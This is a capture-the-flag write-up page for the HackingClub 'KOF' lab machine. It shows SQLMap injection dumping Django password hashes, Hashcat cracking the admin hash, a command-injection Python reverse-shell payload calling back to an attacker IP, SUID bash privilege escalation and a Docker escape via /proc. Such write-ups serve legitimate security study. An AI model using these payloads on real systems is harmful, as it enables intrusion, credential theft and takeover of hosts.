@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[HC] KOF - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <h1>[HackingClub] KOF Writeup</h1>
+                
+                <div class="box-info">
+                    <table>
+                        <tr>
+                            <td>Platform:</td>
+                            <td>HackingClub</td>
+                        </tr>
+                        <tr>
+                            <td>Machine:</td>
+                            <td>KOF</td>
+                        </tr>
+                        <tr>
+                            <td>Category:</td>
+                            <td>Web Exploitation</td>
+                        </tr>
+                        <tr>
+                            <td>OS:</td>
+                            <td>Linux (Docker)</td>
+                        </tr>
+                        <tr>
+                            <td>Difficulty:</td>
+                            <td><span class="difficulty easy">Easy</span></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">sql-injection</span>
+                    <span class="tag">hash crack</span>
+                    <span class="tag">command injection</span>
+                    <span class="tag">suid bash</span>
+                    <span class="tag">docker escape</span>
+                </div>
+
+                <img src="../../images/hackingclub/kof/index.png" alt="KOF Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>## Recon</h2>
+                
+                <p>In the beginning, I used NMAP with the following parameters. I found only ports 22 and 8000 open (it seems to be a Django application running on Linux).</p>
+
+                <pre><code>sudo nmap 172.16.11.225 -Pn -sSVC -T5
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http-alt WSGIServer/0.2 CPython/3.9.19
+|_http-server-header: WSGIServer/0.2 CPython/3.9.19
+|_http-title: KOF 2002 Championship
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>I performed fuzzing on the Django application using Feroxbuster and discovered three directories: register, panel, and dashboard.</p>
+
+                <pre><code>feroxbuster -u http://172.16.11.225:8000/
+
+found:5       errors:0      
+http://172.16.11.225:8000/ 
+http://172.16.11.225:8000/register/ 
+http://172.16.11.225:8000/panel/ 
+http://172.16.11.225:8000/dashboard/</code></pre>
+
+                <img src="../../images/hackingclub/kof/ferox.png" alt="Feroxbuster" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Upon accessing the page, the most prominent feature is a search field that passes the <code>q</code> parameter via GET and displays the searched team.</p>
+                <img src="../../images/hackingclub/kof/q_parameter.png" alt="Q Parameter" style="max-width: 100%; margin: 20px 0;">
+
+                <p>When testing this endpoint with SQLMap, it was identified that the database uses SQLite and that the parameter is vulnerable to SQL injection (SQLi).</p>
+
+                <pre><code>python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --risk 3 --level</code></pre>
+
+                <img src="../../images/hackingclub/kof/sqlmap_q1.png" alt="SQLMap 1" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/kof/sqlmap_q2.png" alt="SQLMap 2" style="max-width: 100%; margin: 20px 0;">
+
+                <h2>## Exploitation</h2>
+                
+                <p>We can include the <code>--dbms sqlite</code> flag to specify that the database in use is SQLite.</p>
+
+                <p>To enumerate the database tables, we use the <code>--tables</code> option:</p>
+
+                <pre><code>python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --dbms "sqlite" --tables --threads 10
+
+[12 tables]
++----------------------------+
+| auth_group                 |
+| auth_group_permissions     |
+| auth_permission            |
+| auth_user                  |
+| auth_user_groups           |
+| auth_user_user_permissions |
+| authentication_teams       |
+| django_admin_log           |
+| django_content_type        |
+| django_migrations          |
+| django_session             |
+| sqlite_sequence            |
++----------------------------+</code></pre>
+
+                <p>From the <code>auth_user</code> table, we want to extract the <code>username</code>, <code>password</code>, <code>is_staff</code>, and <code>is_superuser</code> columns:</p>
+
+                <pre><code>$ python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --dbms "sqlite" --threads 10 -T auth_user -C username,password,is_staff,is_superuser --dump
+
+Table: auth_user
+[3 entries]
++----------+------------------------------------------------------------------------------------------+----------+--------------+
+| username | password                                                                                 | is_staff | is_superuser |
++----------+------------------------------------------------------------------------------------------+----------+--------------+
+| lucas    | pbkdf2_sha256$600000$uK8mOpGqJgz6n8NpSq6sW4$teEmzYbauC23hUiCWchvGVcOxbPkNOIEq4yZ3ZCc2vw= | 0        | 0            |
+| sitara   | pbkdf2_sha256$600000$hgmRaAKIjaJXPw15HJtGzM$rcr8QB224t9Rf8e1AKpyfimvWLTJl1r+ZCGTtvKI8X4= | 0        | 0            |
+| vanessa  | pbkdf2_sha256$720000$uPmPwj655iBMXMnJkLwRfZ$yqgjRdOIa3GV9uFMTFSR6RLTRfz/PQxQ6u31NkYtYMQ= | 1        | 1            |
++----------+------------------------------------------------------------------------------------------+----------+--------------+</code></pre>
+
+                <p>The user "vanessa" is likely the admin. We can use Hashcat to crack the hash (PBKDF2-SHA256 from Django):</p>
+
+                <pre><code>hashcat -m 10000 hash /usr/share/seclists/Passwords/rockyou.txt
+
+pbkdf2_sha256$720000$uPmPwj655iBMXMnJkLwRfZ$yqgjRdOIa3GV9uFMTFSR6RLTRfz/PQxQ6u31NkYtYMQ=:princess1</code></pre>
+
+                <p>Therefore, the admin password for "vanessa" is <code>princess1</code>. Upon accessing the <code>/panel</code> endpoint with admin creds:</p>
+                <img src="../../images/hackingclub/kof/panel1.png" alt="Panel 1" style="max-width: 100%; margin: 20px 0;">
+
+                <p>By clicking to generate an IP and then on "Test Connection," we can analyze the request. A POST request is made to the backend with the CSRF, game, vpn, and test_connection parameters.</p>
+                <img src="../../images/hackingclub/kof/panel2.png" alt="Panel 2" style="max-width: 100%; margin: 20px 0;">
+
+                <p>If we place a local IP in the <code>test_connection</code> parameter, it responds that the connection was successful.</p>
+                <img src="../../images/hackingclub/kof/panel3.png" alt="Panel 3" style="max-width: 100%; margin: 20px 0;">
+
+                <p>We can try to establish a reverse connection by injecting a <code>;</code> (since it could be executed in bash) and using Python. Payload:</p>
+
+                <pre><code>;export RHOST="10.0.10.235";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';</code></pre>
+
+                <img src="../../images/hackingclub/kof/shell_request.png" alt="Shell Request" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/kof/shell.png" alt="Shell" style="max-width: 100%; margin: 20px 0;">
+
+                <h2>## Post exploitation</h2>
+                
+                <p>At first glance, using <code>ps aux</code>, I identified that we are in a Docker environment. I couldn't find the first flag, meaning the first objective is to escalate to root, and the second is to perform a Docker escape.</p>
+
+                <p>After running <code>linpeas</code> on the server, I found that <code>/usr/bin/bash</code> may be exploitable (it has the SUID bit set):</p>
+
+                <pre><code>═╣ Breakout via mounts
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
+
+-rwsr-xr-x 1 root root 1.3M Apr 23  2023 /usr/bin/bash 
+
+═╣ /proc mounted? ................. Yes</code></pre>
+
+                <pre><code>cp /bin/bash /tmp/
+# You need to copy it from the host as the bash binaries might be different
+chown root:root bash
+chmod 4777 bash
+bash -p</code></pre>
+
+                <p>By exploiting this, we will escalate privileges to root in order to retrieve the first flag in <code>/root</code>.</p>
+
+                <h2>## Docker escape/breakout</h2>
+                
+                <p>To perform the Docker breakout/escape, I will use the <code>/proc</code> endpoint. First, I need to retrieve the Docker process ID by running <code>ps aux | grep docker</code>.</p>
+                <img src="../../images/hackingclub/kof/id_proc.png" alt="ID Process" style="max-width: 100%; margin: 20px 0;">
+
+                <p>With this, we can access the Docker process directory, navigate to the root directory, and then escape to the root directory of the host machine running the Docker container. So <code>cd /proc/2741/root/</code>.</p>
+                <img src="../../images/hackingclub/kof/docker_breakout.png" alt="Docker Breakout" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Here are the two flags: one for the default root user after privilege escalation (<code>flag.txt</code>), and the other for the Docker breakout (<code>root.txt</code>).</p>
+
+                <p><strong>Disclaimer:</strong> Docker breakout can be achieved in other ways, such as using Process Injection.</p>
+                <ul>
+                    <li><a href="https://github.com/W3ndige/linux-process-injection/">Linux Process Injection - W3ndige</a></li>
+                    <li><a href="https://www.panoptica.app/research/7-ways-to-escape-a-container">7 Ways to Escape a Container - Panoptica</a></li>
+                </ul>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackingClub // KOF</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
